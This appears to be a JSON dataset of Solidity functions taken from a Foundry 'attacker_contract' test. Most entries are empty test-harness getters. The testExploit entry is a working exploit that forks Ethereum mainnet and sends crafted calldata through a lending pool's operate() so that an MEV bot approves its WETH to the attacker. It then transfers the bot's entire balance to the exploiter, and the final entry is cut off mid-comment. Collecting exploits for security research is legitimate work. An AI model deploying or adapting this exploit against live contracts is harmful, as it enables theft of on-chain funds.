[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        exploiter = cheats.addr(31_337);\n\n        // fork mainnet at block 15625424\n        cheats.createSelectFork(\"mainnet\", 15_625_424);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"MEV Bot balance before exploit:\", weth.balanceOf(MEVBOT), 18);\n\n        Structs.Info[] memory _infos = new Structs.Info[](1);\n        _infos[0] = Structs.Info({owner: address(this), number: 1});\n\n        Structs.ActionArgs[] memory _args = new Structs.ActionArgs[](1);\n        _args[0] = Structs.ActionArgs(\n            // ActionType actionType;\n            Structs.ActionType.Call,\n            // uint256 accountId;\n            0,\n            // AssetAmount amount;\n            Structs.AssetAmount(\n                // bool sign; // true if positive\n                false,\n                // AssetDenomination denomination;\n                Structs.AssetDenomination.Wei,\n                // AssetReference ref;\n                Structs.AssetReference.Delta,\n                // uint256 value;\n                0\n            ),\n            // uint256 primaryMarketId;\n            0,\n            // uint256 secondaryMarketId;\n            0,\n            // address otherAddress;\n            MEVBOT,\n            // uint256 otherAccountId;\n            0,\n            // bytes data;\n            //abi.encodeWithSignature(\"approve(address,uint256)\", address(this), type(uint256).max)\n            // no idea of what of how this byte calldata works\n            bytes.concat(\n                abi.encode(\n                    0x0000000000000000000000000000000000000000000000000000000000000003,\n                    address(pool),\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    0x00000000000000000000000000000000000000000000000000000000000000e0,\n                    0x000000000000000000000000000000000000000000000beff1ceef246ef7bd1f,\n                    0x0000000000000000000000000000000000000000000000000000000000000001,\n                    0x0000000000000000000000000000000000000000000000000000000000000020,\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    0x0000000000000000000000000000000000000000000000000000000000000000,\n                    address(this),\n                    address(weth)\n                ),\n                abi.encode(\n                    0x00000000000000000000000000000000000000000000000000000000000000a0,\n                    address(this),\n                    0x0000000000000000000000000000000000000000000000000000000000000040,\n                    0x00000000000000000000000000000000000000000000000000000000000000a0,\n                    0x0000000000000000000000000000000000000000000000000000000000000004,\n                    0x4798ce5b00000000000000000000000000000000000000000000000000000000,\n                    0x0000000000000000000000000000000000000000000000000000000000000002,\n                    0x0000000000000000000000000000000000000000000000000000000000000004,\n                    0x0000000000000000000000000000000000000000000000000000000000000001,\n                    0x0000000000000000000000000000000000000000000000000000000000000001,\n                    0x0000000000000000000000000000000000000000000000000000000000000002,\n                    0x0000000000000000000000000000000000000000000000000000000000000002\n                )\n            )\n        );\n\n        pool.operate(_infos, _args);\n\n        emit log_named_decimal_uint(\"Contract BADCODE WETH Allowance\", weth.allowance(MEVBOT, address(this)), 18);\n\n        weth.transferFrom(MEVBOT, exploiter, weth.balanceOf(MEVBOT));\n\n        emit log_named_decimal_uint(\"MEV Bot WETH balance After exploit:\", weth.balanceOf(MEVBOT), 18);\n\n        emit log_named_decimal_uint(\"Exploiter WETH balance After exploit:\", weth.balanceOf(exploiter), 18);\n\n        assertEq(weth.balanceOf(MEVBOT), 0);\n    }\n\n    /**\n",
    "description": ""
  }
]